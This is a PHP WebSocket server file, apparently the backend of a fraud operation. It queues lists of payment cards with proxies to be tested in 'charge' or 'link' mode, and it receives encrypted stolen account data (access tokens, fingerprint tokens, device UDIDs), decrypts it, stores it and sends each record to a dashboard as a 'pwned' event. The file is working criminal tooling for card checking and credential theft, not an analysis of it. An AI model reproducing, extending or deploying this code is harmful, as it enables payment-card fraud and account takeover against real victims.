<?php

use \GatewayWorker\Lib\Gateway;
use \SleekDB\Store;
use DarkSide\Fun;

class Events
{

    /**
     * @param int $client_id
     * @param mixed $message
     */
    public static function onWorkerStart($businessWorker)
    {
        echo "[ Status ] Gateway Worker:: Started\n";
    }

    public static function onWebSocketConnect($client_id, $data)
    {
//        var_export($data);

        if (isset($data['server']['SERVER_NAME']) && $data['server']['HTTP_HOST'] !== SOCKET_SERVER) {
            echo "A client connected from unauthorized host: {$data['server']['HTTP_HOST']} - Expecting: " . SOCKET_SERVER . "\n";

            if (Gateway::isOnline($client_id)) {
                Gateway::sendToCurrentClient(json_encode([
                    'type' => 'reload',
                ], JSON_THROW_ON_ERROR));
            }
            return Gateway::closeClient($client_id);
        }

        $active_users = new Store(LOG_DB['active_users'], LOG_DB['data_dir'], SleekDB);
        if (isset($data['get']['id']) && count($active_users->findBy(['user_id', '===', $data['get']['id']])) <= 0) {
            if (Gateway::isOnline($client_id)) {
                Gateway::sendToCurrentClient(json_encode([
                    'type' => 'reload',
                ], JSON_THROW_ON_ERROR));
            }
            return Gateway::closeClient($client_id);
        }

        // check auth
        $client_session = Gateway::getSession($client_id);
        echo json_encode($data, JSON_PRETTY_PRINT) . PHP_EOL;

        $client = $data['get']['id'];
        $client_session['user_id'] = $client;
        $time = date(CONFIG['time_stamp_format']);

        Gateway::updateSession($client_id, $client_session);

        $update = $active_users->createQueryBuilder()
            ->where(['user_id', '===', $client])
            ->getQuery()
            ->update([
                'socket_id' => $client_id,
                'active_since' => $time,
                'status' => 'online'
            ]);

//        echo json_encode($client_session, JSON_PRETTY_PRINT); exit;

        return "";

    }

    public static function onConnect($client_id)
    {
        $client_session = Gateway::getSession($client_id);
        if (!isset($client_session['authenticated'])) {

            $key = md5($client_id . date('r') . '0xpurifier|BlackOps|2077Katana');
            $token = hash('sha256', md5($client_id . $key));
            $security_keys = new Store(LOG_DB['security_keys'], LOG_DB['data_dir'], SleekDB);

            $set_auth_key = $security_keys->insert([
                'key' => $key,
                'token' => $token,
                'verified' => false
            ]);

            $client_session['token'] = $token;
            $client_session['key'] = $key;
            Gateway::updateSession($client_id, $client_session);

            Gateway::sendToCurrentClient(json_encode([
                'type' => 'authenticate',
                'key' => $key
            ], JSON_THROW_ON_ERROR));
            echo "Authenticating client ID: {$client_id}\n";

        }
    }

    public static function onMessage($client_id, $message)
    {
        // debug
        // echo "client:{$_SERVER['REMOTE_ADDR']}:{$_SERVER['REMOTE_PORT']} gateway:{$_SERVER['GATEWAY_ADDR']}:{$_SERVER['GATEWAY_PORT']}  client_id:$client_id session:".json_encode($_SESSION)." onMessage:".substr($message, 0, 100)."...(".(strlen($message) - 100)." chars more)\n\n";

        $message_data = json_decode($message, true);
        $client_session = Gateway::getSession($client_id);

//       echo "\n\n[ MESSAGE DATA ]\n{$message}\n\n";
//
//       $cs = json_encode($client_session, JSON_PRETTY_PRINT);
//       echo "[ CLIENT SESSION ]\n{$cs}\n\n";

        if (
            isset(
                $client_session['authenticated'],
                $client_session['user_id'],
                $client_session['token']
            ) && $client_session['authenticated'] === "{$client_session['user_id']}_{$client_session['token']}") {


            switch ($message_data['type']) {

                case 'scan_result':

//                    if (isset(
//                        $message_data['client_id'],
//                        $message_data['cc_status'],
//                    )) {
//                        Gateway::sendToClient($message_data['client_id'], json_encode([
//                            'type' => $message_data['type'],
//                            'data' => $message_data['cc_status']
//                        ], JSON_THROW_ON_ERROR));
//                    } else {
//                        echo "[!] Missing payload ... " . json_encode($message_data);
//                    }

                    break;

                case "check_cards":
                    if (isset(
                        $message_data['list'],
                        $message_data['mode'],
                        $message_data['proxy'],
                    )) {

                        $mode = $message_data['mode'];
                        switch (strtolower($mode)) {
                            case "charge":
                                $mode = strtolower($mode);
                                break;

                            default:
                                $mode = 'link';
                                break;
                        }

                        $init_queue = new Store(LOG_DB['checker'], LOG_DB['data_dir'], SleekDB);
                        $init_cards = new Store(LOG_DB['check_cards'], LOG_DB['data_dir'], SleekDB);

                        $list = json_decode($message_data['list'], true);
                        $entries = [];

                        foreach ($list as $cc) {

//                           $check_card = $init_cards->findBy(['card','===',$cc]);
//                           if (count($check_card) > 0) {
//                               continue;
//                           }

//                           $check_card = $init_queue->findBy(['card','===',$cc]);
//                           if (count($check_card) <= 0) {
//                               $queue = $init_queue->insert([
//                                   'status' => 'pending',
//                                   'card' => $cc,
//                                   'proxy' => $message_data['proxy'],
//                                   'client_id' => $message_data['client_id'],
//                                   'socket_server' => $message_data['socket_server'],
//                               ]);
//                           }

                            $entries[] = [
                                'mode' => $mode,
                                'status' => 'pending',
                                'card' => $cc,
                                'proxy' => $message_data['proxy'],
                                'client_id' => $message_data['client_id'],
                                'socket_server' => $message_data['socket_server'],
                            ];
                        }

                        if (count($entries) >= 1) {

                            switch (count($entries)) {
                                case 1:
                                    $queue = $init_cards->insert($entries[0]);
                                    break;

                                default:
                                    $queue = $init_cards->insertMany($entries);
                                    break;
                            }

                            Gateway::sendToCurrentClient(json_encode([
                                'type' => 'cards_queued'
                            ], JSON_THROW_ON_ERROR));

                        } else {
                            Gateway::sendToCurrentClient(json_encode([
                                'type' => 'checked_already'
                            ], JSON_THROW_ON_ERROR));
                        }

                    } else {
                        Gateway::sendToCurrentClient(json_encode([
                            'type' => 'cards_queued'
                        ], JSON_THROW_ON_ERROR));
                    }
                    break;

                case 'check_list': // check cc
                    if (isset(
                        $message_data['list'],
                        $message_data['proxy']
                    )) {

                        $init_queue = new Store(LOG_DB['checker'], LOG_DB['data_dir'], SleekDB);

                        $list = json_decode($message_data['list'], true);
                        $entries = [];

                        foreach ($list as $cc) {

//                           $check_card = $init_queue->findBy(['card','===',$cc]);
//                           if (count($check_card) > 0) {
//                               continue;
//                           }

                            $entries[] = [
                                'status' => 'pending',
                                'card' => $cc,
                                'proxy' => $message_data['proxy'],
                                'client_id' => $message_data['client_id'],
                                'socket_server' => $message_data['socket_server'],
                            ];
                        }

                        if (count($entries) >= 1) {

                            switch (count($entries)) {
                                case 1:
                                    $queue = $init_queue->insert($entries[0]);
                                    break;

                                default:
                                    $queue = $init_queue->insertMany($entries);
                                    break;
                            }

                            Gateway::sendToCurrentClient(json_encode([
                                'type' => 'list_queued'
                            ], JSON_THROW_ON_ERROR));

                        } else {
                            Gateway::sendToCurrentClient(json_encode([
                                'type' => 'checked_already'
                            ], JSON_THROW_ON_ERROR));
                        }


                    }
                    break;

                case 'user_subscribe':
                    if (isset(
                            $message_data['user_info'],
                            $message_data['channel']
                        ) && !isset($client_session['client_id'])) {

                        $client_session['client_id'] = $client_id;

                        echo "Client connected: {$client_id}\n";

                        if (!isset(CHANNELS[strtolower($message_data['channel'])])) {
                            echo "[!] Invalid Channel...\n";
                            return "";
                        }

                        $channel_id = (int)CHANNELS[strtolower($message_data['channel'])]; // channel id

                        $client_session['channel_id'] = $channel_id;


                        Gateway::updateSession($client_id, $client_session);

                        echo "Client joined at channel[{$message_data['channel']}] -> $channel_id\n";


                        if (is_array($message_data['user_info'])) {
                            foreach ($message_data['user_info'] as $key => $info) {
                                if (is_string($info)) {
                                    $message_data[$key] = strip_tags($info);
                                }
                            }
                        }

                        $new_message = [
                            'type' => 'info',
                            'client_id' => $client_session['user_id'],
                            'user_info' => $message_data['user_info'],
                            'time' => date('Y-m-d H:i:s')
                        ];

                        Gateway::sendToGroup($channel_id, json_encode($new_message));

                        $message = json_encode([
                            'type' => 'joined',
                            'client_id' => $client_session['user_id'],
                        ], JSON_THROW_ON_ERROR);
                        Gateway::sendToCurrentClient($message);
                        Gateway::joinGroup($client_id, $channel_id);
//                        echo "\nInfo: {$message}\n";

                    } else {
//                       $cs = json_encode($client_session, JSON_PRETTY_PRINT);
//                       echo "[ SUBSCRIBE ERROR ]\n{$message}\n{$cs}\n\n";
                    }

                    break;

                case 'account_data':
                    if (!isset($message_data['acc_data'])) {
                        throw new \Exception("\$message_data['acc_data'] not set. client_ip:{$_SERVER['REMOTE_ADDR']} \$message:$message");
                    }
                    $fun = new Fun();
                    $accounts = new Store(LOG_DB['storage'], LOG_DB['data_dir'], SleekDB);
                    $decoded = $fun->auth_dec($message_data['acc_data']);
                    $data = json_decode($decoded, true);
                    echo "Data received: " . $decoded . " (" . (strlen($decoded) - 250) . " chars more)\n\n";
                    Gateway::sendToCurrentClient(json_encode(['response' => 'logged'], JSON_THROW_ON_ERROR));

                    if (
                        is_array($data) &&
                        count($data) > 0 &&
                        isset(
                            $data['account']['access_token'],
                            $data['account']['fingerprint_token'],
                            $data['account']['user_id'],
                            $data['account']['udid'],
                        )
                    ) {
                        echo "Data decrypted: " . substr($decoded, 0, 250) . "...(" . (strlen($decoded) - 250) . " chars more )\n";

                        if (isset($data['account']['_id'])) {
                            unset($data['account']['_id']);
                        }

                        $insert = $accounts->insert($data['account']);
                        $new_message = [
                            'type' => 'pwned',
                            'details' => $insert
                        ];
                        Gateway::sendToGroup(1, json_encode($new_message));
                        echo "Data forwarded to dashboard\n\n";
                        echo "Processing data\n\n";

                    }

                    return "";
                    break;

                case 'say':

                    if (!isset($_SESSION['room_id'])) {
                        throw new \Exception("\$_SESSION['room_id'] not set. client_ip:{$_SERVER['REMOTE_ADDR']}");
                    }
                    $room_id = $_SESSION['room_id'];
                    $client_name = $_SESSION['client_name'];


                    if ($message_data['to_client_id'] !== 'all') {
                        $new_message = array(
                            'type' => 'say',
                            'from_client_id' => $client_id,
                            'from_client_name' => $client_name,
                            'to_client_id' => $message_data['to_client_id'],
                            'content' => "<b>对你说: </b>" . nl2br(htmlspecialchars($message_data['content'])),
                            'time' => date('Y-m-d H:i:s'),
                        );
                        Gateway::sendToClient($message_data['to_client_id'], json_encode($new_message));
                        $new_message['content'] = "<b>你对" . htmlspecialchars($message_data['to_client_name']) . "说: </b>" . nl2br(htmlspecialchars($message_data['content']));
                        return Gateway::sendToCurrentClient(json_encode($new_message));
                    }

                    $new_message = array(
                        'type' => 'say',
                        'from_client_id' => $client_id,
                        'from_client_name' => $client_name,
                        'to_client_id' => 'all',
                        'content' => nl2br(htmlspecialchars($message_data['content'])),
                        'time' => date('Y-m-d H:i:s'),
                    );
                    return Gateway::sendToGroup($room_id, json_encode($new_message));
                    break;

                default:
                    break;

            }

        } elseif ($message_data['type'] === "authenticate") {

            if ($client_session['token'] === $message_data['token']) {
                $client_session['authenticated'] = "{$client_session['user_id']}_{$message_data['token']}";
                Gateway::updateSession($client_id, $client_session);

                echo "Client: {$client_id} was successfully authenticated!\n";
                // welcome
                $welcome = [
                    'type' => 'welcome'
                ];

//               echo "[ WELCOME ]\n";
                Gateway::sendToCurrentClient(json_encode($welcome));

            } else {
//               echo "[ AUTHENTICATION ERROR ]\n";
                echo "Client: {$client_id} authentication error...\n";
            }

            echo json_encode($client_session, JSON_PRETTY_PRINT) . PHP_EOL;

        }

        return "";

    }

    /**
     * @param integer $client_id
     */

    public static function onClose($client_id)
    {
        // debug
        // echo "client:{$_SERVER['REMOTE_ADDR']}:{$_SERVER['REMOTE_PORT']} gateway:{$_SERVER['GATEWAY_ADDR']}:{$_SERVER['GATEWAY_PORT']}  client_id:$client_id onClose:''\n";

        $client_session = Gateway::getSession($client_id);
        $client = $client_session['user_id'] ?? "";

        echo "A client has disconnected: {$client_id}\n\n";
        $active_users = new Store(LOG_DB['active_users'], LOG_DB['data_dir'], SleekDB);
        $time = date(CONFIG['time_stamp_format']);

        $update = $active_users->createQueryBuilder()
            ->search(['user_id'], $client)
            ->search(['socket_id'], $client_id)
            ->getQuery()
            ->update([
                'active_since' => $time,
                'status' => 'offline'
            ]);
        $security_keys = new Store(LOG_DB['security_keys'], LOG_DB['data_dir'], SleekDB);

        if (isset($client_session['key'])) {
            $delete_auth_key = $security_keys->deleteBy(['key', '===', $client_session['key']]);

            $new_message = [
                'type' => 'disconnected',
                'from_client_id' => $client,
//               'from_client_name'=>$_SESSION['client_name'],
                'time' => date('Y-m-d H:i:s')
            ];
            return Gateway::sendToAll(json_encode($new_message));
        }

    }

}
